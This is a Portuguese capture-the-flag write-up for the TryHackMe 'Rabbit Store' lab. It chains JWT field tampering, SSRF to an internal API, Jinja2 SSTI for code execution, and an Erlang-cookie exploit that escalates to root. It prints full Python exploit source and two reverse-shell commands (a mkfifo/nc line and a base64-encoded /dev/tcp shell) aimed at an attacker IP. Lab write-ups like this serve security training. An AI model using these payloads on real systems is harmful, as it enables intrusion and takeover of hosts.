<h1 align="center">🐰 Write-up – Rabbit Store (TryHackMe)</h1>

## 🔍 Varredura
Realizei a varredura com `nmap` para identificar os serviços disponíveis:

```bash
nmap -v -sSV --open -p- 10.10.120.84 -oN nmap
```
<p align="center"> <img src="https://github.com/user-attachments/assets/325455f7-3faf-4656-8ad6-53825332b46e" alt="nmap" width="1500px"> </p>

Após varredura, encontramos as seguintes portas abertas:

**22**     : SSH
**80**     : Servidor WEB (Apache)
**4369**   : Erlang Port Mapper Daemon
**25672**  : RabbitMQ

## Enumeração
Nesta etapa, o primeiro passo é identificar os serviços que estão em execução em cada porta. Existem diversas técnicas para isso, e utilizei as seguintes:

### Porta 22
`````bash
nc -v 10.10.120.84 22
`````
<p align="center"> <img src="https://github.com/user-attachments/assets/8753a289-dc94-4ff7-a609-b22213168582" alt="ssh" width="1500px"> </p>


### Porta 80
Identificar os métodos HTTP permitidos:
```bash
curl -v -X OPTIONS http://cloudsite.thm:80
```
<p align="center"> <img src="https://github.com/user-attachments/assets/f37c30d0-78b6-4b47-a939-690818a93c71" alt="metodos" width="1500px"> </p>

Métodos identificados:
```http
Allow: GET,POST,OPTIONS,HEAD
```

Além disso, é extremamente importante acessar o site para identificar o que está rodando na aplicação. Para isso, no TryHackMe, sempre adiciono o domínio no arquivo */etc/hosts*.
```bash
sudo echo '10.10.120.84   cloudsite.thm' >> /etc/hosts
```

<p align="center"> <img src="https://github.com/user-attachments/assets/ef827307-152b-4f99-bdb7-2a909e74368a" alt="web1"> </p>

Logo de cara uma página de login me chamou atenção, mas quando tento acessar ela tenho um erro de conexão com o site

![web2](https://github.com/user-attachments/assets/39b9c401-afa7-4fa4-b1fd-303b680fcff9)


Neste caso, se obervar bem a URL do site foi alterada, basta adicionar no */etc/hosts* novamente e o problema será resolvido.

![login](https://github.com/user-attachments/assets/a2224019-0b53-4dc1-a4b1-93b102fcd760)

Vamos então tentar criar um cadastro e acessar o login, assim que conectamos nos deparamos com a seguinte tela:

![block](https://github.com/user-attachments/assets/b7ccac2c-af9e-4aad-992e-54e426275e7e)

Mas ainda não é momento para desespero kkkkk
Na URL temos uma condição que chamou bastante atenção:
```http
http://storage.cloudsite.thm/dashboard/inactive
```
Então pensei: ~ E se eu mudar para **active**? Mas como nem tudo são flores, tire o erro abaixo:

![inactve](https://github.com/user-attachments/assets/4064a185-8c1d-4bed-acbd-443a45db5beb)

Resolvi então analisar essa requisição com o burp e para minha surpresa tinha um *[JWT](https://www.alura.com.br/artigos/o-que-e-json-web-tokens?srsltid=AfmBOooyDHP7xTLNv1CXXNVrwv4GCGV0wndkBalax1WsROtmO44lwf-1)*

![jwt](https://github.com/user-attachments/assets/043592b5-4b3e-423c-8576-33602a434ae6)

Existem várias ferramentas e formas automáticas de decodificar um *[JWT](https://www.alura.com.br/artigos/o-que-e-json-web-tokens?srsltid=AfmBOooyDHP7xTLNv1CXXNVrwv4GCGV0wndkBalax1WsROtmO44lwf-1)*, mas prefiro fazer de forma manual.
Um token *[JWT](https://www.alura.com.br/artigos/o-que-e-json-web-tokens?srsltid=AfmBOooyDHP7xTLNv1CXXNVrwv4GCGV0wndkBalax1WsROtmO44lwf-1)* é dividido em três partes, separadas por pontos (.):

```bash
<HEADER>.<PAYLOAD>.<SIGNATURE>
````
Exemplo real:
```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.
eyJlbWFpbCI6IlRlc3RlQGVtYWlsLmNvbSIsInN1YnNjcmlwdGlvbiI6ImluYWN0aXZlIiwiaWF0IjoxNzQ2OTgyMzA4LCJleHAiOjE3NDY5ODU5MDh9
.
NiKKOi2Kd6Hr5pWz58f3h_lkjnTn3lm8_Fa0n0h7JUA
```
Só nos interessa o payload nesse momento:
````bash
echo 'eyJlbWFpbCI6IlRlc3RlQGVtYWlsLmNvbSIsInN1YnNjcmlwdGlvbiI6ImluYWN0aXZlIiwiaWF0IjoxNzQ2OTgyMzA4LCJleHAiOjE3NDY5ODU5MDh9' | base64 -d
````

Para esse Token *[JWT](https://www.alura.com.br/artigos/o-que-e-json-web-tokens?srsltid=AfmBOooyDHP7xTLNv1CXXNVrwv4GCGV0wndkBalax1WsROtmO44lwf-1)* temos o seguinte retorno:

```bash
{
	"email":"Teste@email.com",
	"subscription":"inactive",
	"iat":1746982308,
	"exp":1746985908
}

```
Observe que subscription está inativa, e se criarmos um usuário com ela ativa, vamos tentar usando o burp novamente:

![bur1](https://github.com/user-attachments/assets/ebcde246-9e92-4dd6-8416-df081b1dcfce)

Agora que o usuário foi criado e com *subscription active* podemoss acessar o site.

É possível enviar um arquivo para o servidor de duas formas: diretamente a partir do host local ou utilizando uma URL remota.
No caso da URL, costumo hospedar o arquivo no meu próprio servidor web (por exemplo, usando Python HTTP server) e envio o link para o destino, observando se há alguma resposta ou requisição feita pelo servidor alvo.

Mas antes de enviar um link ao realizar a criação e usuário pelo burp a URL me chamou atenção por ter um /api, decidi fazer um fuzzing nessa URL para ver se encontro algo mais:
```bash
dirsearch -u http://storage.cloudsite.thm/api -w /usr/share/wordlists/dirb/big.txt --remove-extensions -t400
```
<p align="center"><img src="https://github.com/user-attachments/assets/dae750c1-a535-4cbb-9ab6-35d61953ba19" alt="dirsearch" width="1500px"></p>
Tentei acessar a URL direto no navegador mas não tive acesso, então voltei para o envio de um link do meu próprio servidor:

![Screenshot_2](https://github.com/user-attachments/assets/7be32daf-be4f-4d2f-9fe1-8beab91a7882)

E após clicar em *Upload*

<p align="center"><img src="https://github.com/user-attachments/assets/97d1d471-4f20-45b3-b6b0-65c022d44c56" alt="image" width="1500px"></p>

****Voilà, it's done!****

Pensei então... “Beleza, já conseguimos avançar um pouco... mas o que mais eu posso descobrir?”
Vamos enumerar um pouco mais e tentar entender melhor o que está por trás dessa aplicação. Será que ela utiliza algum CMS? Um framework conhecido? O que está rodando aí por trás dos panos?

Uma das formas mais simples e eficazes de começar essa investigação é utilizando o curl para analisar os headers da resposta do servidor:
```bash
curl -v -X OPTIONS http://storage.cloudsite.thm/dashboard/active
````
<p align="center"><img src="https://github.com/user-attachments/assets/0f830773-1d7b-45dc-a958-44f66a775f57" width="1500px"></p>

O framework Express é bastante popular para criar aplicações web, APIs e serviços back-end. Por padrão, o Express costuma rodar na porta 3000 se não for configurado de outra forma. Então... Meu primeiro pensamento é ir direto na porta 3000
Mas se eu fizer uma solicitação para *http://storage.cloudsite.thm:3000/api/docs* não vai funcionar porque esta sendo roteado pelo apache, resolvo então fazer via localhost

![1](https://github.com/user-attachments/assets/837445af-ad99-4354-a8fa-285d8222ffb1)

Agora podemos fazer uma nova requisição pelo caminho encontrado:

![image](https://github.com/user-attachments/assets/c42e705b-1d0a-4259-ad89-17f4b7eb7af1)

Pronto!!!! Recebemos retorno e encontramos um novo endpoint...
Observe na imagem que realizar um **GET** nesse novo endpoint não é permitido, pois ele esta associado ao método POST.
Adicionando um Content-Length: 0  é solicitado usuário e senha, como sabemos que está no formato json adicionamos:

![u](https://github.com/user-attachments/assets/33877410-0609-4f4e-936e-57289c25ef7d)

Neste caso, parece que temos uma vulnerabilidade [SSTI](https://blog.solyd.com.br/server-side-template-injection-ssti-o-que-e-e-como-remediar/), para quem nunca ouviu falar:
> SSTI (Server-Side Template Injection) é uma vulnerabilidade de segurança que ocorre quando dados fornecidos pelo usuário são inseridos de maneira insegura em um template processado no lado do servidor, permitindo que um atacante injete código malicioso que pode ser executado no servidor. Isso ocorre geralmente em aplicações web que utilizam motores de templates como Jinja2, Twig, Velocity, etc., para gerar conteúdo dinâmico no servidor.

Para confirmar, utilizamos um payload simples:
```bash
{
	"username": "${{<%[%'\"}}%\\."
}
````
![payload](https://github.com/user-attachments/assets/cf511e45-042b-446e-911c-b40ba0f5bd1a)

Agora que já temos certeza da vulnerabilidade, hora de Explora-la:

## Exploração

Após uma pesquisa rápida encontrei um site que fala sobre cargas jinja2

https://kleiber.me/blog/2021/10/31/python-flask-jinja2-ssti-example/

Para essa exploração usaremos:
```bash
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
![id](https://github.com/user-attachments/assets/ab247d24-158b-4d61-980b-f76982663e04)

Vamos então adicionar um PAYLOAD para conseguirmos um RCE:

![load](https://github.com/user-attachments/assets/29665f6f-410f-44d4-8d50-8b4f83084259)

Ao deixar o listener ativo, temos então uma shell:
<p align="center"><img src="https://github.com/user-attachments/assets/9d2d8718-98de-4d00-ab8d-94e9245cdd57" width="1500px"></p>

A primeira key foi fácil:
<p align="center"><img src="https://github.com/user-attachments/assets/4724f4a4-0e3c-46d0-b3ff-20c8fc38f9d1" width="1500px"></p>

## Escalação de privilégios
Depois de bastante tempo enumerando e procurando uma forma de escalar privilégios, encontrei um arquivo relacionado ao Erlang. No começo, não dei muita atenção... mas sabe aquela voz na cabeça dizendo: "Tem algo ali, tem algo ali"? Pois é — tinha mesmo algo ali! 😂

<p align="center"><img src="https://github.com/user-attachments/assets/2dc12f4d-623f-4866-be87-9ed63b4076d6" width="1500px"></p>

Agora precisamos identificar qual porta o Erlang está executando.
```bash
 epmd -names
````
<p align="center"><img src="https://github.com/user-attachments/assets/f81725a2-344b-4872-8c78-9f26dd77a98a" width="1500px"></p>

O próximo passo Seria listar os usuários no RabbitMQ. Mas ele só funciona com usuário elevado o que nós não temos. Então... a busca continua!

Fiz algumas pesquisas e encontrei um github com uma exploração para ele:

https://github.com/gteissier/erl-matter

Mas quando executei tive um erro.
```bash
python2 er.py 10.10.120.84 25672 wTBuIlKmoBLx183M "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.21.173.102 4421 >/tmp/f"
````
<p align="center"><img src="https://github.com/user-attachments/assets/3924e851-02cd-4850-913f-3eaaaa3efb52" width="1500px"></p>

Pelo que entendi a função recv_reply() esperava exatamente dois termos Erlang na resposta, mas recebeu menos (provavelmente nenhum, ou um só).
Decidi usar o chatGPT ao meu favor e corrigi o código:

````python
#!/usr/bin/env python2

from struct import pack, unpack
from cStringIO import StringIO
from socket import socket, AF_INET, SOCK_STREAM, SHUT_RDWR
from hashlib import md5
from binascii import hexlify, unhexlify
from random import choice
from string import ascii_uppercase
import sys
import argparse
import erlang as erl

def rand_id(n=6):
    return ''.join([choice(ascii_uppercase) for c in range(n)]) + '@nowhere'

parser = argparse.ArgumentParser(description='Execute shell command through Erlang distribution protocol')

parser.add_argument('target', action='store', type=str, help='Erlang node address or FQDN')
parser.add_argument('port', action='store', type=int, help='Erlang node TCP port')
parser.add_argument('cookie', action='store', type=str, help='Erlang cookie')
parser.add_argument('--verbose', action='store_true', help='Output decode Erlang binary term format received')
parser.add_argument('--challenge', type=int, default=0, help='Set client challenge value')
parser.add_argument('cmd', default=None, nargs='?', action='store', type=str, help='Shell command to execute, defaults to interactive shell')

args = parser.parse_args()
name = rand_id()

sock = socket(AF_INET, SOCK_STREAM, 0)
assert(sock)
sock.connect((args.target, args.port))

def send_name(name):
    FLAGS = (
        0x7499c +
        0x01000600 # HANDSHAKE_23|BIT_BINARIES|EXPORT_PTR_TAG
    )
    return pack('!HcQIH', 15 + len(name), 'N', FLAGS, 0xdeadbeef, len(name)) + name

sock.sendall(send_name(name))

data = sock.recv(5)
assert(data == '\x00\x03\x73\x6f\x6b')

data = sock.recv(4096)
(length, tag, flags, challenge, creation, nlen) = unpack('!HcQIIH', data[:21])
assert(tag == 'N')
assert(nlen + 19 == length)
challenge = '%u' % challenge

def send_challenge_reply(cookie, challenge):
    m = md5()
    m.update(cookie)
    m.update(challenge)
    response = m.digest()
    return pack('!HcI', len(response)+5, 'r', args.challenge) + response

sock.sendall(send_challenge_reply(args.cookie, challenge))

data = sock.recv(3)
if len(data) == 0:
    print('wrong cookie, auth unsuccessful')
    sys.exit(1)
else:
    assert(data == '\x00\x11\x61')
    digest = sock.recv(16)
    assert(len(digest) == 16)

print('[*] authenticated onto victim')

def erl_dist_recv(f):
    hdr = f.recv(4)
    if len(hdr) != 4:
        return
    (length,) = unpack('!I', hdr)
    data = f.recv(length)
    if len(data) != length:
        return
    data = data[1:]

    while data:
        (parsed, term) = erl.binary_to_term(data)
        if parsed <= 0:
            print('failed to parse erlang term, may need to peek into it')
            break
        yield term
        data = data[parsed:]

def encode_string(name, type=0x64):
    return pack('!BH', type, len(name)) + name

def send_cmd_old(name, cmd):
    data = (unhexlify('70836804610667') +
            encode_string(name) +
            unhexlify('0000000300000000006400006400037265') +
            unhexlify('7883680267') +
            encode_string(name) +
            unhexlify('0000000300000000006805') +
            encode_string('call') +
            encode_string('os') +
            encode_string('cmd') +
            unhexlify('6c00000001') +
            encode_string(cmd, 0x6b) +
            unhexlify('6a') +
            encode_string('user'))

    return pack('!I', len(data)) + data

def send_cmd(name, cmd):
    ctrl_msg = (6,
        erl.OtpErlangPid(erl.OtpErlangAtom(name), '\x00\x00\x00\x03', '\x00\x00\x00\x00', '\x00'),
        erl.OtpErlangAtom(''),
        erl.OtpErlangAtom('rex'))
    msg = (
        erl.OtpErlangPid(erl.OtpErlangAtom(name), '\x00\x00\x00\x03', '\x00\x00\x00\x00', '\x00'),
        (
            erl.OtpErlangAtom('call'),
            erl.OtpErlangAtom('os'),
            erl.OtpErlangAtom('cmd'),
            [cmd],
            erl.OtpErlangAtom('user')
        ))

    new_data = '\x70' + erl.term_to_binary(ctrl_msg) + erl.term_to_binary(msg)
    return pack('!I', len(new_data)) + new_data

def recv_reply(f):
    terms = [t for t in erl_dist_recv(f)]
    if args.verbose:
        print('\nreceived %r' % (terms))

    if len(terms) < 2:
        print("[!] No full response received (expected 2 terms), skipping output...")
        return ''

    answer = terms[1]
    if len(answer) != 2:
        print("[!] Malformed answer term, skipping output...")
        return ''

    return answer[1]

# modo interativo
if not args.cmd:
    while True:
        try:
            cmd = raw_input('%s:%d $ ' % (args.target, args.port))
        except EOFError:
            print('')
            break

        sock.sendall(send_cmd(name, cmd))
        reply = recv_reply(sock)
        sys.stdout.write(reply)
else:
    sock.sendall(send_cmd(name, args.cmd))
    reply = recv_reply(sock)
    sys.stdout.write(reply)

print('[*] disconnecting from victim')
sock.close()

````

Agora criei um payload com uma carga em base64:

![image](https://github.com/user-attachments/assets/d5ec707d-dbf5-48b9-a1c5-e45786e4499c)

````bash
python2 er.py 10.10.120.84 25672 wTBuIlKmoBLx183M "echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMjEuMTczLjEwMi80NDIxIDA+JjE= | base64 -d | bash"
````

<p align="center"><img src="https://github.com/user-attachments/assets/9e3490ec-bec1-4f83-a9b3-2581ebfa53dd" width="1500px"></p>

O próximo passo seria listar os usuários mas observei que o arquivo eraling.cookie não tinha pemrissões sufiientes, por isso dei permissão 400 para ele.
> A permissão 400 em sistemas Linux/Unix se refere a permissões de arquivo. Essas permissões são representadas por um número de três dígitos, onde cada dígito especifica permissões para o usuário, grupo e outros, respectivamente.

Agora sim podemos executar o rabbitmqctl

````bash
rabbitmqctl --erlang-cookie "wTBuIlKmoBLx183M" --node rabbit@forge export_definitions /tmp/creds.json
````
Dentro do arquivo creds.json vai ter o hash criptografado, cabe a você agora consegui-lo.

Para descriptografar o hash, criei um código em python:
````python

import base64
import binascii

def extrair_parte2_hash(base64_hash):
    try:
        # Decodifica a string base64 para bytes
        hash_binario = base64.b64decode(base64_hash)
        
        # Converte para string hexadecimal
        hash_hex = hash_binario.hex()
        
        # Divide o hash: parte1 (8 primeiros caracteres), parte2 (resto)
        parte1 = hash_hex[:8]
        parte2 = hash_hex[8:]

        print(f"[+] Parte 1: {parte1}")
        print(f"[+] Parte 2: {parte2}")
        return parte2

    except binascii.Error as e:
        print(f"[!] Erro ao decodificar base64: {e}")
    except Exception as e:
        print(f"[!] Erro inesperado: {e}")

# Exemplo de uso:
base64_hash = "hash_aqui"
extrair_parte2_hash(base64_hash)
````

Após executar o aquivo use a *Parte 2* e altere o usuário com:
````bash
su root
````

Por fim, a última chave:
<p align="center"><img src="https://github.com/user-attachments/assets/00d3e7b9-758f-4b4a-bf40-2f8afc421422" width="1500px"></p>

Até a próxima, good luck!
